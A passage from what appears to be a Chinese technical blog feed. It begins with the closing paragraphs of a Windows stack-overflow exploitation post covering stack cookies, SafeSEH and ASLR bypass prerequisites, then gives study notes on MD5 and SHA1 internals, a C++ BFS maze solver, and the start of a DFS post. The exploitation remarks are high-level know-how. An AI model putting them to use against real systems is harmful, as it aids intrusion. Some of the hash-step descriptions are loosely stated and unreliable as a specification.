</span><br></pre></td></tr></table></figure><p>请注意，尽管上面的函数中没有数组，但MSVC足够聪明，它知道只要使用了_alloca函数就有必要在生成的函数代码中放入栈Cookie。</p><p>这里讨论的技术代表了一种现代Windows的栈溢出的攻击面，到目前为止，还没有明确的安全缓解措施。然而，它们的可靠利用依赖于这里讨论的特定代码模式以及（在任意写入的情况下）一个链式内存泄漏原语。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>对于栈溢出漏洞，虽然现代的操作系统已经提供了许多防御机制，但在今天的Windows应用程序中仍然存在并且可被利用。如果存在非Safeseh模块，那么利用这种溢出漏洞就比较容易，因为还没有哪种默认的安全缓解机制强大到可以防止局部变量破坏而导致的任意写入攻击。就目前来说，防御这类攻击的最强机制是ASLR，为了绕过这种机制，攻击者需要借助于非ASLR模块或内存泄漏漏洞。正如我们在这篇文章中所展示的那样，非Safeseh模块和非ASLR模块在如今的Windows 10系统以及许多第三方应用程序中仍不乏足迹。</p><p>与过去相比，尽管栈溢出漏洞的利用技术变得愈加复杂，但与堆中的其他内存破坏类型的漏洞相比，栈溢出是最容易理解的一个。</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>MD5</title>
      <link href="/2023/04/01/MD5/"/>
      <url>/2023/04/01/MD5/</url>
      
        <content type="html"><![CDATA[<h1 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h1><p>MD5是一种哈希算法，任意长度的输入经过处理后输出为128位的信息，且尽量使结果不冲突和信息不可逆。MD5以512位为一个分组处理输入，每个分组分成16个32位的子分组，经过处理后，输出四个32位分组，这四个32位分组级联后生成一个128位的MD5值</p><h2 id="MD5的特点"><a href="#MD5的特点" class="headerlink" title="MD5的特点"></a>MD5的特点</h2><p>单向散列算法：将一种任意长度的消息数据压缩到某一固定长度，该过程是不可逆的。</p><p> MD5 Message Digest Algorithm 是对任意长度的消息进行运算，产生一个128位的消息摘要。</p><p> 压缩性:任意长度的数据，算出的MD5值长度都是固定的。</p><p> 容易计算:从原数据计算出MD5值很容易。</p><p> 抗修改性:对原数据进行任何改动，哪怕只修改1个字节，所得到的MD5值都有很大区别。</p><p> 强抗碰撞:已知原数据和其MD5值，想找到一个具有相同MD5值的数据(即伪造数据)是非常困难的。</p><p>MD5的作用是让大容量信息在用数字签名软件签署私人密钥前被”压缩”成一种保密的格式(就是把一个任意长度的字节串变换成一定长的十六进制数字串)。</p><p>在内存中是小端序存储</p><p>将原始数据每512bits为一个分组 (这就是前面要求填充到512整数倍的原因)，对每组分别进行处理</p><h2 id="操作过程"><a href="#操作过程" class="headerlink" title="操作过程"></a>操作过程</h2><p>数据末尾填充0x80</p><p>计算原始数据的长度</p><p>用零填充直到数据的字节数是64的倍数为止</p><p>把数据进行分组一组为64(512位)个字节 进行计算最终获得一个16个字节的MD5码</p><h2 id="计算过程"><a href="#计算过程" class="headerlink" title="计算过程"></a>计算过程</h2><p>1.进行组一数据的计算<br> 定义临时变量并赋值<br> a &#x3D; A; b &#x3D; B; c &#x3D; C; d &#x3D; D            &#x2F;&#x2F; 1 2 3 4</p><p> 2.计算a的值                    &#x2F;&#x2F;4 10 2 3<br> a &#x3D; (a + F + K[i] + M[g]) &lt;&lt; s[i]) + b;</p><p> 3.交换数据<br> b &#x3D; a<br> c &#x3D; b<br> d &#x3D; c<br> a &#x3D; d</p><p> 循环2.3两个步骤64次</p><p> 4.计算<br> A &#x3D; A + a;B &#x3D; B + b;C &#x3D; C + c;D &#x3D; D + d;</p><p> 5.跟新1.中a，b，c，d计算组二数据</p><p>当完成最后一组数据的计算获得 A；B；C；D以小端序组合获得最终16个字节就是MD5</p><p>如：A1A2A3A4 B1B2B3B4 C1C2C3C4 D1D2D3D4</p><p>A4A3A2A1B4B3B2B1C4C3C2C1D4D3D2D1</p><p>共循环64次</p><p>F的计算<br> 0-15<br> F &#x3D; (b&amp;c)|((<del>b)&amp;d)<br> 16-31<br> F &#x3D; (d&amp;b)|((</del>d)&amp;c)<br> 32-47<br> F &#x3D; b^c^d<br> 48-63<br> F &#x3D; c^(b|(~d))</p><p>K[i]的计算<br> 这是一个64个常量组成的数组在循环过程中依次获取<br> S[i]的计算<br> 这是一个64(每组都乘4)个常量组成的数组在循环过程中依次获取</p><p>M[g]的计算<br> 0-15<br> 从原始数据的第i个4个字节(小端序)<br> 39 31 31 4d 61 6f 48 61 69 80<br> 第一次使用<br> 4d 31 31 39<br> 第二次使用<br> 61 48 6f 41<br> 16-31<br> 从原始数据的第(5<em>i+1)%16个4个字节(小端序)<br> 32-47<br> 从原始数据的第(3</em>i+5)%16个4个字节(小端序)<br> 48-63<br> 从原始数据的第(7*i)%16个4个字节(小端序)</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BFS</title>
      <link href="/2023/04/01/BFS/"/>
      <url>/2023/04/01/BFS/</url>
      
        <content type="html"><![CDATA[<h1 id="BFS"><a href="#BFS" class="headerlink" title="BFS"></a>BFS</h1><h2 id="解决迷宫问题"><a href="#解决迷宫问题" class="headerlink" title="解决迷宫问题"></a>解决迷宫问题</h2><h3 id="迷宫问题"><a href="#迷宫问题" class="headerlink" title="迷宫问题"></a>迷宫问题</h3><p>Crawling in process… Crawling failed Time Limit:1000MS    Memory Limit:65536KB     64bit IO Format:%I64d &amp; %I64u<br>Submit Status<br>Description</p><p>定义一个二维数组：</p><p>int maze [5] [5] &#x3D; {</p><p> 0, 1, 0, 0, 0,</p><p> 0, 1, 0, 1, 0,</p><p> 0, 0, 0, 0, 0,</p><p> 0, 1, 1, 1, 0,</p><p> 0, 0, 0, 1, 0,</p><p>};</p><p>它表示一个迷宫，其中的1表示墙壁，0表示可以走的路，只能横着走或竖着走，不能斜着走，要求编程序找出从左上角到右下角的最短路线。      </p><p>输入</p><p>一个5 × 5的二维数组，表示一个迷宫。数据保证有唯一解。      </p><p>输出</p><p>左上角到右下角的最短路径</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>使用结构体来保存横纵坐标即(x,y)，输出没要求距离长度，定义一个step保存长度也可以</p><p>创建一个队列 queue<xxx> q;</xxx></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(q不为空)&#123;</span><br><span class="line"><span class="keyword">if</span>(到达右下角)&#123;</span><br><span class="line">    输出或是退出</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>()&#123;</span><br><span class="line">         枚举四个方向  合适的就入队</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">q.<span class="built_in">pop</span>();  <span class="comment">//出队列</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如何输出路径呢？</p><p>这里我们使用一个 print() 函数， 在函数内 递归调用 print()函数，直到为左上角就输出，</p><p>怎么调用前一个呢？</p><p>我们可以再创建一个结构体的二维数组，每个对应位置存放的是，它爸爸的x,y坐标</p><p>Step pre[5] [5];</p><p>在 q.push(); 的时候 pre[nx] [ny].x &#x3D; s.x,pre[nx] [ny].y &#x3D; s.y;</p><p>这样pre[][] 当前对应的[nx] [ny]，就应该存放 它爸爸的x,y</p><p>输出：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(x == <span class="number">0</span> &amp;&amp; y == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;(0, 0)\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">print</span>(pre[x] [y].x,pre[x] [y].y);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;(%d, %d)\n&quot;</span>,x,y);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Step</span>&#123;</span><br><span class="line"><span class="type">int</span> x,y;</span><br><span class="line"><span class="type">int</span> steps;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> a[<span class="number">5</span>][<span class="number">5</span>],book[<span class="number">5</span>][<span class="number">5</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> Next[<span class="number">4</span>][<span class="number">2</span>] = &#123;&#123;<span class="number">0</span>,<span class="number">1</span>&#125;,&#123;<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,<span class="number">-1</span>&#125;,&#123;<span class="number">-1</span>,<span class="number">0</span>&#125;&#125;;</span><br><span class="line">queue&lt;Step&gt; q;</span><br><span class="line">Step pre[<span class="number">5</span>][<span class="number">5</span>];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(x==<span class="number">0</span>&amp;&amp;y==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;(0, 0)\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(pre[x][y].x,pre[x][y].y);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;(%d, %d)\n&quot;</span>,x,y);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">bfs</span><span class="params">()</span></span>&#123;</span><br><span class="line">Step nd;</span><br><span class="line">    nd.x=<span class="number">0</span>,nd.y=<span class="number">0</span>,nd.steps=<span class="number">0</span>; book[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    q.<span class="built_in">push</span>(nd);</span><br><span class="line">    <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">Step s = q.<span class="built_in">front</span>();</span><br><span class="line"><span class="keyword">if</span>(s.x == <span class="number">4</span> &amp;&amp; s.y == <span class="number">4</span>)&#123;</span><br><span class="line"><span class="built_in">print</span>(<span class="number">4</span>,<span class="number">4</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line"><span class="type">int</span> nx = s.x + Next[i][<span class="number">0</span>], ny = s.y + Next[i][<span class="number">1</span>], step = s.steps+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>((nx&lt;=<span class="number">4</span>&amp;&amp;nx&gt;=<span class="number">0</span>) &amp;&amp; (ny&lt;=<span class="number">4</span>&amp;&amp;ny&gt;=<span class="number">0</span>) &amp;&amp; book[nx][ny]==<span class="number">0</span> &amp;&amp; a[nx][ny]==<span class="number">0</span>)&#123;</span><br><span class="line">Step p; p.x=nx,p.y=ny,p.steps=step;</span><br><span class="line">book[nx][ny] = <span class="number">1</span>; pre[nx][ny].x = s.x,pre[nx][ny].y = s.y;</span><br><span class="line">q.<span class="built_in">push</span>(p);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">q.<span class="built_in">pop</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">5</span>;j++)</span><br><span class="line">        cin&gt;&gt;a[i][j];</span><br><span class="line"><span class="built_in">bfs</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="学习代码"><a href="#学习代码" class="headerlink" title="学习代码"></a>学习代码</h2><p>一般来说，是不需要输出图像的。这时，代码可以简化，更便于学习</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">110</span>;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> g[N][N]; <span class="comment">// 迷宫</span></span><br><span class="line"><span class="type">int</span> d[N][N]; <span class="comment">// 到起点的距离</span></span><br><span class="line"><span class="type">bool</span> st[N][N]; <span class="comment">// 标记是否已经走过</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Point</span> &#123;</span><br><span class="line">    <span class="type">int</span> x, y;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 四个方向</span></span><br><span class="line"><span class="type">int</span> dx[] = &#123;<span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>&#125;, dy[] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">-1</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// BFS模板</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">bfs</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    queue&lt;Point&gt; q;</span><br><span class="line">    q.<span class="built_in">push</span>(&#123;<span class="number">0</span>, <span class="number">0</span>&#125;);</span><br><span class="line">    st[<span class="number">0</span>][<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">    d[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (q.<span class="built_in">size</span>()) &#123;</span><br><span class="line">        <span class="keyword">auto</span> t = q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果到达终点，返回距离</span></span><br><span class="line">        <span class="keyword">if</span> (t.x == n - <span class="number">1</span> &amp;&amp; t.y == m - <span class="number">1</span>) <span class="keyword">return</span> d[n - <span class="number">1</span>][m - <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 四个方向</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">            <span class="type">int</span> a = t.x + dx[i], b = t.y + dy[i];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 判断是否越界或者障碍物</span></span><br><span class="line">            <span class="keyword">if</span> (a &gt;= <span class="number">0</span> &amp;&amp; a &lt; n &amp;&amp; b &gt;= <span class="number">0</span> &amp;&amp; b &lt; m &amp;&amp; g[a][b] == <span class="number">0</span> &amp;&amp; !st[a][b]) &#123;</span><br><span class="line">                q.<span class="built_in">push</span>(&#123;a, b&#125;);</span><br><span class="line">                st[a][b] = <span class="literal">true</span>;</span><br><span class="line">                d[a][b] = d[t.x][t.y] + <span class="number">1</span>; <span class="comment">// 到起点的距离加一</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>; <span class="comment">// 如果无法到达终点，返回-1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++)</span><br><span class="line">            cin &gt;&gt; g[i][j];</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="built_in">bfs</span>() &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Algorithms </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SHA1</title>
      <link href="/2023/04/01/SHA1/"/>
      <url>/2023/04/01/SHA1/</url>
      
        <content type="html"><![CDATA[<h1 id="SHA1"><a href="#SHA1" class="headerlink" title="SHA1"></a>SHA1</h1><p>安全哈希算法（Secure Hash Algorithm）主要适用于数字签名标准（Digital Signature Standard DSS）<br> 里面定义的数字签名算法（Digital Signature Algorithm DSA）。</p><p>该算法输入报文的长度不限，产生的输出是一个160位的报文摘要。输入是按512 位的分组进行处理的。SHA-1是不可逆的、防冲突，并具有良好的雪崩效应。</p><p> 算法：<br> 1.数据末尾填充0x80<br> 39 31 31 4d 61 6f 48 61 69      “911MaoHai”<br> 39 31 31 4d 61 6f 48 61 69 80<br> 9 * 8 &#x3D; 72   2.计算原始数据的长度<br> 72 &#x3D; 0x00 00 00 00 00000048<br> 39 31 31 4d 61 6f 48 61 69 80 00<br> 00 00 00 00 00 00 00 00 00 00 00<br> 00 00 00 00 00 00 00 00 00 00 00<br> 00 00 00 00 00 00 00 00 00 00 00<br> 00 00 00 00 00 00 00 00 00 00 48 大端序的数据长度<br> 3.用零填充直到数据的字节数是64的倍数为止<br> 4.把数据进行分组一组为64(512位)个字节 进行计算最终获得一个20个字节的SHA1码<br> 5.初始化五个值 小端序<br> A &#x3D; 0x67452301;<br> B &#x3D; 0xEFCDAB89;<br> C &#x3D; 0x98BADCFE;<br> D &#x3D; 0x10325476;<br> E &#x3D; 0xC3D2E1F0;<br> 6.将我们分好的64个字节扩充为320个字节 4个字节为一组循环80次<br> 7.进行组一数据的计算<br> 定义临时变量并赋值<br> a &#x3D; A; b &#x3D; B; c &#x3D; C; d &#x3D; D; e &#x3D; E<br> 8.计算e的值<br> e &#x3D; (a &lt;&lt; 5)+ f + e + k + w[i];<br> 9.计算b的值<br> b &#x3D; b&lt;&lt;30<br> 10.交换数据<br> b &#x3D; a<br> c &#x3D; b<br> d &#x3D; c<br> e &#x3D; d<br> a &#x3D; e<br> 循环8.9.10三个步骤80次<br> 11.计算<br> A &#x3D; A + a;B &#x3D; B + b;C &#x3D; C + c;D &#x3D; D + d;E &#x3D; E + e<br> 10.跟新7.中a，b，c，d，e计算组二数据<br> 当完成最后一组数据的计算获得 A；B；C；D；E以da端序组合获得最终20个字节(160Bits)就是SHA1码<br> 如：A1A2A3A4 B1B2B3B4 C1C2C3C4 D1D2D3D4 E1E2E3E4<br> A1A2A3A4B1B2B3B4C1C2C3C4D1D2D3D4E1E2E3E4<br> 数据扩充到320个字节<br> 将源数据的64个字节直接赋值到新的空间中<br> 取出当前位置的前面第三个4字节 ^ 取出当前位置的前面第八个4字节 ^ 取出当前位置的前面第十四个4字节 ^ 取出当前位置的前面第十六个4字节<br> 循环左移一位 结果大端序存储<br> 共循环64次<br> 39 31 31 4d 61 6f 48 61 69 80 00<br> 00 00 00 00 00 00 00 00 00 00 00<br> 00 00 00 00 00 00 00 00 00 00 00<br> 00 00 00 00 00 00 00 00 00 00 00<br> 00 00 00 00 00 00 00 00 00 00 00<br> 00 00 00 00 00 00 00 00 00 00 48<br> 75 5A DF A0            —-后面的256个字节需要填充<br> 00 00 00 00 ^ 00 00 00 00 ^ 00 00 00 00 ^ 61 69 80 00  &lt;&lt; 1 &#x3D; 75 5A DF A0<br> 共循环80次<br> f、k的计算<br> 0-19<br> f &#x3D; d^(b&amp;(c^d))<br> k &#x3D; 0x5A827999<br> 20-39<br> f &#x3D; b^c^d<br> k &#x3D; 0x6ED9EBA1<br> 40-59<br> f &#x3D; (b&amp;c)|(b&amp;d)|(c&amp;d)<br> k &#x3D; 0x8F1BBCDC<br> 60-79<br> f &#x3D; b^c^d<br> k &#x3D; 0xCA62C1D6<br> 共循环80次<br> w[i]的计算<br> 数据扩充后的第i个4个字节整型 大端序取出<br> 第一次<br> 39 31 31 4d<br> 第二次<br> 4d 61 6f 48</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">Note: All variables are unsigned 32 bits and wrap modulo 232 when calculating</span><br><span class="line">Initial variables:</span><br><span class="line">h0 := 0x67452301</span><br><span class="line">h1 := 0xEFCDAB89</span><br><span class="line">h2 := 0x98BADCFE</span><br><span class="line">h3 := 0x10325476</span><br><span class="line">h4 := 0xC3D2E1F0</span><br><span class="line">Pre-processing:</span><br><span class="line">append the bit &#x27;1&#x27; to the message</span><br><span class="line">append k bits &#x27;0&#x27;, where k is the minimum number &gt;= 0 such that the resulting message</span><br><span class="line">    length (in bits) is congruent to 448(mod 512)</span><br><span class="line">append length of message (before pre-processing), in bits, as 64-bit big-endian integer</span><br><span class="line">Process the message in successive 512-bit chunks:</span><br><span class="line">break message into 512-bit chunks</span><br><span class="line">for each chunk</span><br><span class="line">    break chunk into sixteen 32-bit big-endian words w[i], 0 ≤ i ≤ 15</span><br><span class="line">    Extend the sixteen 32-bit words into eighty 32-bit words:</span><br><span class="line">    for i from 16 to 79</span><br><span class="line">        w[i] := (w[i-3] xor w[i-8] xor w[i-14] xor w[i-16]) leftrotate 1</span><br><span class="line">    Initialize hash value for this chunk:</span><br><span class="line">    a := h0</span><br><span class="line">    b := h1</span><br><span class="line">    c := h2</span><br><span class="line">    d := h3</span><br><span class="line">    e := h4</span><br><span class="line">    Main loop:</span><br><span class="line">    for i from 0 to 79</span><br><span class="line">        if 0 ≤ i ≤ 19 then</span><br><span class="line">            f := (b and c) or ((not b) and d)</span><br><span class="line">            k := 0x5A827999</span><br><span class="line">        else if 20 ≤ i ≤ 39</span><br><span class="line">            f := b xor c xor d</span><br><span class="line">            k := 0x6ED9EBA1</span><br><span class="line">        else if 40 ≤ i ≤ 59</span><br><span class="line">            f := (b and c) or (b and d) or(c and d)</span><br><span class="line">            k := 0x8F1BBCDC</span><br><span class="line">        else if 60 ≤ i ≤ 79</span><br><span class="line">            f := b xor c xor d</span><br><span class="line">            k := 0xCA62C1D6</span><br><span class="line">        temp := (a leftrotate 5) + f + e + k + w[i]</span><br><span class="line">        e := d</span><br><span class="line">        d := c</span><br><span class="line">        c := b leftrotate 30</span><br><span class="line">        b := a</span><br><span class="line">        a := temp</span><br><span class="line">    Add this chunk&#x27;s hash to result so far:</span><br><span class="line">    h0 := h0 + a</span><br><span class="line">    h1 := h1 + b</span><br><span class="line">    h2 := h2 + c</span><br><span class="line">    h3 := h3 + d</span><br><span class="line">    h4 := h4 + e</span><br><span class="line">Produce the final hash value (big-endian):</span><br><span class="line">digest = hash = h0 append h1 append h2 append h3 append h4</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DFS</title>
      <link href="/2023/04/01/DFS/"/>
      <url>/2023/04/01/DFS/</url>
      
        <content type="html"><![CDATA[<h1 id="DFS"><a href="#DFS" class="headerlink" title="DFS"></a>DFS</h1><h2 id="一-深度优先搜索（dfs）"><a href="#一-深度优先搜索（dfs）" class="headerlink" title="一.深度优先搜索（dfs）"></a>一.深度优先搜索（dfs）</h2><h3 id="1-什么叫dfs"><a href="#1-什么叫dfs" class="headerlink" title="1.什么叫dfs"></a>1.什么叫dfs</h3><p>深度优先搜索类似于树的先序遍历；</p><p>是利用栈或者递归的方式实现的，体现出了后进先出的特点；</p><p>通俗来说就是一次访问一条路，一直朝着一个方向探索，直到遇到死路退回到前一个分支，继续探索；</p><p>一般来说，深度搜索解决的问题主要为寻求所有解和连通性。</p><h3 id="2-遍历过程"><a href="#2-遍历过程" class="headerlink" title="2.遍历过程"></a>2.遍历过程</h3><p>（1）从图中某个初始顶点v出发，首先访问初始顶点v。</p><p>（2）然后依次从v的未被访问的邻接点w，再从w出发进行深度优先遍历，直到图中所有与v有路径相通的的顶点都被访问过为止。</p><h3 id="3-算法设计"><a href="#3-算法设计" class="headerlink" title="3.算法设计"></a>3.算法设计</h3><p>解决问题:<br>（1）如何确定一个顶点是否访问过？</p><p>设置一个visited[]全局数组，</p><p>visited[i]&#x3D;0表示顶点i没有访问;</p><p>visited[i]&#x3D;1表示顶点i已经访问过。</p><p>（在图中也可以修改图本身来实现）</p><h3 id="4-dfs算法模板"><a href="#4-dfs算法模板" class="headerlink" title="4.dfs算法模板"></a>4.dfs算法模板</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 